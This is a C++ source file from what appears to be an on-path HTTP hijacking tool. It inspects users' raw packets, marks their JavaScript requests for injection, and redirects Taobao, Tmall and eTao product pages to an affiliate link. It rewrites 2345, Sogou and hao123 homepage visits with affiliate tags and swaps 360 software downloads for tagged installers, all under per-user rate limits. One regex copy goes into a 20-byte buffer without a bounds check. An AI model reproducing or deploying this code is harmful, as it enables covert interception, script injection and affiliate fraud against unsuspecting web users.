#include "core.h"
#include "str_util.h"
// extern ConfigLoader *conf;
using namespace std;

#define ngx_str3_cmp(m, c0, c1, c2, c3)                                       \
    *(uint32_t *) m == ((c3 << 24) | (c2 << 16) | (c1 << 8) | c0)


extern Redis *redis;
extern bool taobao_redirect;
extern bool is_inject;

int filterPolicy::loadFileToSet(string filepath,unordered_set<string> &set)
{
    ifstream ifs;
    ifs.open(filepath.c_str(), ios::binary);
    char buffer[2048];
    while (ifs.good()) {
        ifs.getline(buffer,2048);
        if(buffer[0]!=0){
            set.insert(string(buffer));
            printf("Load to set :%s\n",buffer );
        }
    }
    if(set.empty()){
        printf("set is empty\n");
    }else{
        printf("set size is %d\n",set.size());
    }

    ifs.close();

}

int filterPolicy::loadFileToSetIP(string filepath,unordered_set<long> &set)
{
    ifstream ifs;
    ifs.open(filepath.c_str(), ios::binary);
    char buffer[2048];
    while (ifs.good()) {
        ifs.getline(buffer,2048);
        if(buffer[0]!=0){
            set.insert( inet_addr(buffer)  );
            printf("Load IP to set :%s\n",buffer );
        }
    }
    if(set.empty()){
        printf("set is empty\n");
    }else{
        printf("set size is %d\n",set.size());
    }

    ifs.close();
}

void filterPolicy::loadPolicy(int push_total_times_p,int push_interval_p,string config_dir)
{
    push_total_times = push_total_times_p;
    push_interval = push_interval_p;
    ip_white_list.clear();
    ip_black_list.clear();
    js_black_list.clear();
    loadFileToSetIP(config_dir+"whiteblacklist/ip_white_list",ip_white_list);
    loadFileToSetIP(config_dir+"whiteblacklist/ip_black_list",ip_black_list);
    loadFileToSet(config_dir+"whiteblacklist/js_black_list",js_black_list);
    // loadFileToSet("url_white_list",url_white_list);
    // loadFileToSet("url_black_list",url_black_list);
    // loadFileToSet("host_white_list",host_white_list);
    // loadFileToSet("host_black_list",host_black_list);

    const char * pattern              = "[?&]id=([0123456789]*)|itemid=([0123456789]*)";
    const char * pattern_ali_host     = "item.taobao.com|h5.m.taobao.com|detail.m.tmall.com|detail.tmall.com";
    const char * pattern_etao         = "detail/([0123456789]{2,20})";
    const char * pattern_360_browser  = "360se.*exe";
    const char * pattern_360_weishi   = "360safe.*exe";
    const char * pattern_360_shadu    = "360sd.*exe";
    const char * pattern_360_browser2 = "sxie.*exe";

    regcomp(&reg_taobao,pattern,REG_EXTENDED|REG_ICASE);
    regcomp(&reg_ali_host,pattern_ali_host,REG_EXTENDED);
    regcomp(&reg_etao,pattern_etao,REG_EXTENDED);

    regcomp(&reg_360_browser,pattern_360_browser,REG_EXTENDED);
    regcomp(&reg_360_weishi,pattern_360_weishi,REG_EXTENDED);
    regcomp(&reg_360_shadu,pattern_360_shadu,REG_EXTENDED);
    regcomp(&reg_360_browser2,pattern_360_browser2,REG_EXTENDED);
}



typedef struct push_info{
    int times;
    int time;
}push_info;
unordered_map<string,push_info> push_memory;


bool filterPolicy::canPush(const char * data,const struct ip* ip,const struct tcphdr * tcp,struct http_header *request,struct push_decide* push_decide)
{
    // 只推送GET请求
    // if (data[0]=='G' && data[1]=='E' && data[2]=='T')
    if ( ngx_str3_cmp(data, 'G', 'E', 'T', ' ') )
    {
        // IP过滤 请求者的ip
        if(ip_black_list.count(ip->ip_src.s_addr)!=0)
        {
            LOG_DEBUG("user ip[%s] in black list \n",inet_ntoa(ip->ip_src));
            return false;
        }

        if(!ip_white_list.empty() && ip_white_list.count( ip->ip_src.s_addr )==0)
        {
            LOG_DEBUG("user ip[%s] not in white list \n",inet_ntoa(ip->ip_src));
            return false;
        }

        // printf("%s\n",data );
        // 解析HTTP头
        int http_content_offset = parseHttpHeadOneLine(data,request);
        int parse_status        = getHttpHeader(data,request,http_content_offset);


        // if(request->referer[0]=='\0'){
        //     // 打印url
        //     if(request->path_with_http){
        //         printf(FONT_COLOR_RED "%s \n" COLOR_NONE, request->path);
        //     }else{
        //         printf(FONT_COLOR_RED "http://%s%s \n" COLOR_NONE, request->host,request->path);
        //     }
        // }
        // if( strcmp(request->ext,"")==0  ||  strcmp(request->ext,"js")==0 || strstr(request->ext,"htm")>0 ){
        //     printf(FONT_COLOR_YELLOW "%s \n" COLOR_NONE, request->host);
        //     printf(FONT_COLOR_YELLOW "%s \n" COLOR_NONE, request->ext);
        //     printf(FONT_COLOR_YELLOW "%s \n" COLOR_NONE, request->user_agent);
        //     printf(FONT_COLOR_YELLOW "%s \n" COLOR_NONE, request->referer);
        // }
        // return false;



        // 头太长的不推
        if(parse_status==-1){
            // LOG_DEBUG("HTTP head too large ,pass");
            return false;
        }

        // 判断是否为js
        if(strcmp(request->ext,"js")==0){
            if(!is_inject){
                return false;
            }
            push_decide->type = 1;
            // printf("%s\n",data );
            // printf(FONT_COLOR_YELLOW "%s   " COLOR_NONE, request->ext);
            // printf(FONT_COLOR_YELLOW "%s\n" COLOR_NONE, request->fileName);

            if(request->extraHeader.count("Referer")>0){
                char pushkey[128];
                snprintf(pushkey,128,"%d %s%s",ip->ip_src,request->referer,request->user_agent);
                // 如果此ip没推送过或者推送超过最大间隔了
                if(push_cache.count(pushkey)==0 || (time(0)-push_cache[pushkey]) > PUSH_INTERVAL ){

                    // js过滤 js在黑名单中或者包含jquery
                    if(js_black_list.count(request->fileName)!=0 || strstr(request->fileName,"jquery")!=false || strstr(request->fileName,"zepto")!=false || strstr(request->fileName,"require")!=false || strstr(request->fileName,"ad")!=false)
                    {
                        // printf("js in black list or include jquery\n");
                        return false;
                    }

                    if(strstr(request->path,"google")!=false){
                        return false;
                    }
                    if(strstr(request->path,"baidu")!=false){
                        return false;
                    }


                    push_cache[pushkey] = time(0);
                    // printf(FONT_COLOR_RED "inject %s\n " COLOR_NONE, request->fileName);
                    // printf(FONT_COLOR_RED "inject %s\n " COLOR_NONE, pushkey);
                    // printf(FONT_COLOR_RED "inject time %d\n " COLOR_NONE, time(0));

                    // ------域名过滤 要请求的域名-----
                    // if(host_black_list.count(request->extraHeader["Host"])!=0)
                    // {
                    //     printf("host [%s] in black list \n",request->host);
                    //     return false;
                    // }

                    // if(!host_white_list.empty() && host_white_list.count( request->extraHeader["Host"] )==0)
                    // {
                    //     printf("host [%s] not in white list \n",request->host );
                    //     return false;
                    // }
                    // -------------------------

                    // --------URL过滤-------
                    // if(url_black_list.count(request->path)!=0)
                    // {
                    //     printf("url in black list \n");
                    //     return false;
                    // }

                    // if(!url_white_list.empty() && url_white_list.count( request->path )==0)
                    // {
                    //     printf("url not in white list \n");
                    //     return false;
                    // }
                    // -------------------------

                    // 如果设置的推送次数限制和间隔限制都为0，则不执行限制逻辑，直接返回true
                    if(push_total_times==0 && push_interval==0)
                    {
                        return true;
                    }
                    // 推送间隔
                    char ip_ua[128];
                    snprintf(ip_ua,128,"%d%s",ip->ip_src,request->user_agent);
                    if(push_memory.count(ip_ua)>0)
                    {
                        // 查看次数和时间间隔是否超过限制，超过则return false，没超过则+1
                        push_info pi;
                        pi = push_memory[ip_ua];
                        if(pi.times < push_total_times && (time(0)-pi.time > push_interval) )
                        {
                            pi.times++;
                            pi.time = time(0);
                            push_memory[ip_ua] = pi;
                            LOG_DEBUG("push to user [%s] times %d last time %ld",ip_ua,pi.times,pi.time);
                        }else{
                            LOG_DEBUG("user [%s] push up to limit or interval",ip_ua);
                            return false;
                        }
                    }else{
                        push_info pi;
                        pi.times = 1;
                        pi.time  = time(0);
                        push_memory[ip_ua] = pi;
                        LOG_DEBUG("push to user [%s] times %d last time %ld",ip_ua,pi.times,pi.time);
                    }

                    return true;
                }
            }


        }else{
            // printf("\n--------------------------------\n");
        	// printf("%s\n", request->path);
            // 如果host是淘宝，则
            if(taobao_redirect){

                char pushkey[128];
                snprintf(pushkey,128,"%d %s",ip->ip_src,request->user_agent);

                if(push_cache.count(pushkey)==0 || (time(0)-push_cache[pushkey]) > PUSH_INTERVAL ){

                    if(request->host[0]=='\0'){
                        return false;
                    }
                    // referer中带alimma的放行
                    if(request->referer[0]!='\0' && strstr(request->referer,"alimma.com")!=false){
                        return false;
                    }
                    int regrs;
                    regmatch_t pmhost[2];
                    regrs = regexec(&reg_ali_host,request->host,1,pmhost,REG_NOTBOL);
                    if(regrs == REG_NOERROR)
                    {
                        // url中含有mm_的不截取
                        if(strstr(request->path,"mm_")!=false)
                            return false;

                        regmatch_t pm[2];
                        regrs = regexec(&reg_taobao,request->path,2,pm,REG_NOTBOL);
                        if(regrs==REG_NOERROR && pm[1].rm_so!=pm[1].rm_eo){
                            push_decide->type = 2;
                            char buf[20];
                            memcpy(buf,request->path+pm[1].rm_so,pm[1].rm_eo-pm[1].rm_so);
                            buf[pm[1].rm_eo-pm[1].rm_so]='\0';
                            snprintf(push_decide->url,2048,"http://go.qdhct.net/qh-dt/?id=%s",buf);
                            // LOG_DEBUG("Redirect-->http://%s/%s",request->host,request->path);
                            return true;
                        }else{
                            // LOG_DEBUG("Not redirect-->http://%s/%s",request->host,request->path);
                        }
                    }else if(strstr(request->host,"s.etao.com")!=false && strstr(request->path,"detail")!=false){

                        regmatch_t pm[2];
                        regrs = regexec(&reg_etao,request->path,2,pm,REG_NOTBOL);
                        if(regrs==REG_NOERROR && pm[1].rm_so!=pm[1].rm_eo){
                            push_decide->type = 2;
                            char buf[20];
                            memcpy(buf,request->path+pm[1].rm_so,pm[1].rm_eo-pm[1].rm_so);
                            buf[pm[1].rm_eo-pm[1].rm_so]='\0';
                            snprintf(push_decide->url,2048,"http://go.qdhct.net/qh-dt/?id=%s",buf);
                            // LOG_DEBUG("Redirect-->http://%s/%s",request->host,request->path);
                            return true;
                        }else{
                            // LOG_DEBUG("Not redirect-->http://%s/%s",request->host,request->path);
                        }
                    }

                    else if(strstr(request->host,"www.2345.com")!=false && strcmp(request->path,"/")==0){
                        push_decide->type = 2;
                        snprintf(push_decide->url,2048,"https://www.2345.com/?23024-0105");
                        // LOG_DEBUG("Redirect-->http://%s/%s",request->host,request->path);
                        return true;

                    }
                    else if(strstr(request->host,"m.2345.com")!=false &&  strcmp(request->path,"/")==0 ){
                        push_decide->type = 2;
                        snprintf(push_decide->url,2048,"http://m.2345.com/?23024-0105");
                        // LOG_DEBUG("%s Redirect-->%s %s",inet_ntoa(ip->ip_src),request->host,request->path);
                        return true;
                    }

                    else if(strstr(request->host,"123.sogou.com")!=false && strcmp(request->path,"/")==0){
                        push_decide->type = 2;
                        snprintf(push_decide->url,2048,"https://123.sogou.com/?12242-0130");
                        // LOG_DEBUG("Redirect-->http://%s/%s",request->host,request->path);
                        return true;
                    }
                    else if(strstr(request->host,"dh.123.sogou.com")!=false &&  strcmp(request->path,"/")==0 ){
                        push_decide->type = 2;
                        snprintf(push_decide->url,2048,"http://dh.123.sogou.com/?12242-0130");
                        // LOG_DEBUG("Redirect-->http://%s/%s",request->host,request->path);
                        return true;
                    }
                    else if(strstr(request->host,"www.hao123.com")!=false &&  strcmp(request->path,"/")==0 ){
                        push_decide->type = 2;
                        snprintf(push_decide->url,2048,"http://www.hao123.com/?tn=96248522_hao_pg");
                        // LOG_DEBUG("%s Redirect-->%s %s",inet_ntoa(ip->ip_src),request->host,request->path);
                        return true;
                    }
                    // 360
                    regmatch_t pm[2];
                    push_decide->type = 2;
                    // 360浏览器
                    regrs = regexec(&reg_360_browser,request->path,1,pm,REG_NOTBOL);
                    if(regrs==REG_NOERROR){
                        printf("%s\n", strutil_replace_insert(request->path,pm[0].rm_so,pm[0].rm_eo,"360se+223643+n6bbacf2f95.exe"));
                        // strcpy(push_decide->url,strutil_replace_insert(request->path,pm[0].rm_so,pm[0].rm_eo,"360se+223643+n6bbacf2f95.exe"));
                        strcpy(push_decide->url,"http://dl.360safe.com/netunion/20140425/360se+223643+n6bbacf2f95.exe");
                        push_cache[pushkey] = time(0);
                        return true;
                    }
                    // 360安全卫士
                    regrs = regexec(&reg_360_weishi,request->path,1,pm,REG_NOTBOL);
                    if(regrs==REG_NOERROR){
                        // strcpy(push_decide->url,strutil_replace_insert(request->path,pm[0].rm_so,pm[0].rm_eo,"360safe+223643+n6bbacf2f95.exe"));
                        strcpy(push_decide->url,"http://dl.360safe.com/netunion/20140425/360safe+223643+n6bbacf2f95.exe");
                        push_cache[pushkey] = time(0);
                        return true;
                    }
                    // 360杀毒
                    regrs = regexec(&reg_360_shadu,request->path,1,pm,REG_NOTBOL);
                    if(regrs==REG_NOERROR){
                        // strcpy(push_decide->url,strutil_replace_insert(request->path,pm[0].rm_so,pm[0].rm_eo,"360sd_223643.exe"));
                        strcpy(push_decide->url,"http://dl.360safe.com/netunion/20140425/360sd_223643.exe");
                        push_cache[pushkey] = time(0);
                        return true;
                    }
                    // 360浏览器2
                    regrs = regexec(&reg_360_browser2,request->path,1,pm,REG_NOTBOL);
                    if(regrs==REG_NOERROR){
                        // strcpy(push_decide->url,strutil_replace_insert(request->path,pm[0].rm_so,pm[0].rm_eo,"360sxie+223643+n6bbacf2f95.exe"));
                        strcpy(push_decide->url,"http://dl.360safe.com/netunion/20140425/sxie+223643+n6bbacf2f95.exe");
                        push_cache[pushkey] = time(0);
                        return true;
                    }

                }
            }
        }
        // printf("user ip:%s \n", inet_ntoa(ip->ip_src));
        // printf("user ip:%4x \n", ip->ip_src);
        // printf("user ip:%ld \n", ip->ip_src);
        // printf("---------------------------------\n");

    }else{
        return false;
    }

    return false;
    // printf("target port :%d\n", ntohs(tcp->dest));
}


// 解析http第一行
int filterPolicy::parseHttpHeadOneLine(const char *data, struct http_header *header) {
    int v_start         = 0;
    int v_length        = 0;
    int i               = 0;
    char tmp[2048];
    bool in_method      = true;
    bool in_host        = false;
    bool in_filename    = false;
    bool in_ext         = false;
    bool in_param       = false;
    bool path_with_http = false;
    int ext_start       = 0;
    int filename_start  = 0;
    int host_sep_num    = 0;
    // printf("%s\n", data);

    while(data[i] != '\n'){

        switch (data[i]){
            case ' ':
                if(in_method){
                    memcpy(header->method, data+v_start, i-v_start);
                    header->method[i-v_start]='\0';
                    in_method = false;
                    in_host    = true;
                }else{
                    memcpy(header->path, data+v_start, i-v_start);
                    header->path[i-v_start]='\0';
                }
                if(data[i+1]=='h'){
                    path_with_http = true;
                    header->path_with_http=true;
                }
                if(in_ext){
                    memcpy(header->ext,data+ext_start,i-ext_start);
                    header->ext[i-ext_start]='\0';
                    in_ext = false;
                }
                if(in_filename){
                    memcpy(header->fileName,data+filename_start,i-filename_start);
                    header->fileName[i-filename_start]='\0';
//                    printf("filename:%s\n",tmp);
                    in_filename = false;
                }

                v_start  = i+1;
//                v_length = 0;
                break;
            case '/':
                host_sep_num++;
                in_host = true;
                if(path_with_http && host_sep_num>=3 && !in_param) {
                    in_host = false;
                    in_filename = true;
                    filename_start = i+1;
                }
                if(path_with_http==false && host_sep_num>=2 && !in_param) {
                    in_host = false;
                    in_filename = true;
                    filename_start = i+1;
                }
                break;
            case '.':
                ext_start = i+1;
                if(in_filename && !in_param && ext_start>filename_start){
                    in_ext = true;
                }

                break;
            case '?':
                in_param = true;
                if(in_ext){
                    memcpy(header->ext,data+ext_start,i-ext_start);
                    header->ext[i-ext_start]='\0';
                    in_ext = false;
                }
                if(in_filename){
                    memcpy(header->fileName,data+filename_start,i-filename_start);
                    header->fileName[i-filename_start]='\0';
//                    printf("filename:%s\n",tmp);
                    in_filename = false;
                }

                break;
            case '\r':
//                memcpy(tmp,data+v_start,v_length);
//                tmp[v_length+1]='\0';
//                cout<<tmp<<endl;
                break;
        }

//        v_length++;
        if(i>1500){
            return -1;
        }else{
            i++;
        }
    }
    // printf("------->%d\n",i );
    return i+1;
}

int filterPolicy::getHttpHeader(const char *str, struct http_header *header,int http_content_offset) {
    // printf("----------\n%s\n----------",str);
    int i    = http_content_offset;
    if(i==-1){
        return -1;
    }
    string tmpKey, tmpValue;
    char paramName[1024];
    int value_start = i;
    char tmp[HTTP_REQUEST_MAX_LEN]={0};
    while (str[i] != '\0') {
        if (str[i] == ':' && str[i + 1] == ' ') {
            // memcpy(tmp,str+value_start,i-value_start);
            // tmp[i-value_start]='\0';
            memcpy(paramName,str+value_start,i-value_start);
            paramName[i-value_start]='\0';
            // tmpKey.assign(tmp);
            // tmpKey.assign(str,value_start,i-value_start);
            value_start = i+2;

        } else if (str[i] == 13 && str[i+1] == 10) {
            if(i-value_start==0)
                return 0;
            // memcpy(tmp,str+value_start,i-value_start);
            // tmp[i-value_start]='\0';

            // tmpValue.assign(tmp);
            // tmpValue.assign(str,value_start,i-value_start);
            // header->extraHeader[tmpKey] = tmpValue;
            // printf("%s-------->%s\n",tmpKey.c_str(), tmpValue.c_str());
            if(strcmp(paramName,"Host")==0){
                memcpy(header->host,str+value_start,i-value_start);
                header->host[i-value_start]='\0';
            }else if(strcmp(paramName,"Referer")==0){
                memcpy(header->referer,str+value_start,i-value_start);
                header->referer[i-value_start]='\0';
            }else if(strcmp(paramName,"User-Agent")==0){
                memcpy(header->user_agent,str+value_start,i-value_start);
                header->user_agent[i-value_start]='\0';
            }
            value_start = i+2;
        }

        if(i>HTTP_REQUEST_MAX_LEN){
            return -1;
        }else{
            i++;
        }
        // printf("%c->%d\n", str[i],str[i]);
    }

    return 0;

}
